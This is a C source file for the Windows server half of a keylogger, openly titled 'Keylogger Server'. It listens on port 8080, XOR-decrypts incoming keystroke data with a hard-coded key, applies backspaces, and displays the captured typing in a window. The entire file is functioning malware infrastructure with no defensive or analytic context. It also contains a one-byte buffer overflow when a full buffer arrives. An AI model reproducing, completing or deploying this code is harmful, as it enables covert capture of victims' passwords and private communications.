#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080
#define WM_SOCKET (WM_USER + 1)
#define MAX_BUFFER 4096
#define ENCRYPTION_KEY "S3cr3tK3y"

char displayBuffer[MAX_BUFFER * 10] = {0}; // Larger buffer to accommodate more data
HWND mainWindow;
SOCKET server_fd, client_socket;
RECT clientRect;
HFONT hFont;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitServer(HWND hwnd);
void decryptData(char *data);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char CLASS_NAME[] = "Server Window Class";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    
    RegisterClass(&wc);

    mainWindow = CreateWindowEx(
        0,
        CLASS_NAME,
        "Keylogger Server",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        800, 600,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (mainWindow == NULL) {
        return 0;
    }

    hFont = CreateFont(
        16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        "Consolas"
    );

    ShowWindow(mainWindow, nCmdShow);
    UpdateWindow(mainWindow);
    InitServer(mainWindow);

    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(hFont);
    return 0;
}

void InitServer(HWND hwnd) {
    WSADATA wsa;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        MessageBox(hwnd, "Failed to initialize Winsock", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        MessageBox(hwnd, "Socket creation failed", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        MessageBox(hwnd, "Bind failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    if (listen(server_fd, 3) == SOCKET_ERROR) {
        MessageBox(hwnd, "Listen failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    WSAAsyncSelect(server_fd, hwnd, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE);
}

void decryptData(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_SIZE: {
            GetClientRect(hwnd, &clientRect);
            InvalidateRect(hwnd, NULL, TRUE);
            return 0;
        }

        case WM_SOCKET: {
            if (WSAGETSELECTERROR(lParam)) {
                closesocket((SOCKET)wParam);
                return 0;
            }

            switch (WSAGETSELECTEVENT(lParam)) {
                case FD_ACCEPT: {
                    client_socket = accept(server_fd, NULL, NULL);
                    if (client_socket == INVALID_SOCKET) {
                        MessageBox(hwnd, "Accept failed", "Error", MB_OK | MB_ICONERROR);
                        return 0;
                    }
                    WSAAsyncSelect(client_socket, hwnd, WM_SOCKET, FD_READ | FD_CLOSE);
                    break;
                }
                
                case FD_READ: {
                    char buffer[MAX_BUFFER] = {0};
                    int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (bytes_read > 0) {
                        buffer[bytes_read] = '\0';
                        decryptData(buffer);
                        
                        // Handle backspace
                        if (buffer[0] == '\b') {
                            int len = strlen(displayBuffer);
                            if (len > 0) {
                                displayBuffer[len - 1] = '\0';
                            }
                        } else {
                            // Check if we need to scroll (remove old data if buffer is getting full)
                            size_t current_len = strlen(displayBuffer);
                            size_t new_data_len = strlen(buffer);
                            
                            if (current_len + new_data_len >= sizeof(displayBuffer) - 1) {
                                // Remove about 1/4 of the oldest data to make room
                                size_t remove_amount = sizeof(displayBuffer) / 4;
                                if (remove_amount > current_len) {
                                    remove_amount = current_len;
                                }
                                
                                memmove(displayBuffer, displayBuffer + remove_amount, 
                                       current_len - remove_amount + 1);
                                current_len = strlen(displayBuffer);
                            }
                            
                            strcat(displayBuffer, buffer);
                        }
                        InvalidateRect(hwnd, NULL, TRUE);
                    }
                    break;
                }

                case FD_CLOSE: {
                    closesocket(client_socket);
                    break;
                }
            }
            return 0;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hbmMem = CreateCompatibleBitmap(hdc, clientRect.right, clientRect.bottom);
            HBITMAP hbmOld = SelectObject(hdcMem, hbmMem);
            
            HBRUSH hBrush = (HBRUSH)GetStockObject(WHITE_BRUSH);
            FillRect(hdcMem, &clientRect, hBrush);
            
            SetBkMode(hdcMem, TRANSPARENT);
            HFONT hOldFont = SelectObject(hdcMem, hFont);
            
            RECT textRect = {
                20,
                20,
                clientRect.right - 20,
                clientRect.bottom - 20
            };
            
            // Draw text with word wrap and scrollable behavior
            DrawText(hdcMem, displayBuffer, -1, &textRect, 
                    DT_WORDBREAK | DT_WORD_ELLIPSIS | DT_LEFT | DT_TOP);
            
            BitBlt(hdc, 0, 0, clientRect.right, clientRect.bottom, 
                   hdcMem, 0, 0, SRCCOPY);
            
            SelectObject(hdcMem, hOldFont);
            SelectObject(hdcMem, hbmOld);
            DeleteObject(hbmMem);
            DeleteDC(hdcMem);
            
            EndPaint(hwnd, &ps);
            return 0;
        }

        case WM_DESTROY: {
            closesocket(client_socket);
            closesocket(server_fd);
            WSACleanup();
            PostQuitMessage(0);
            return 0;
        }

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}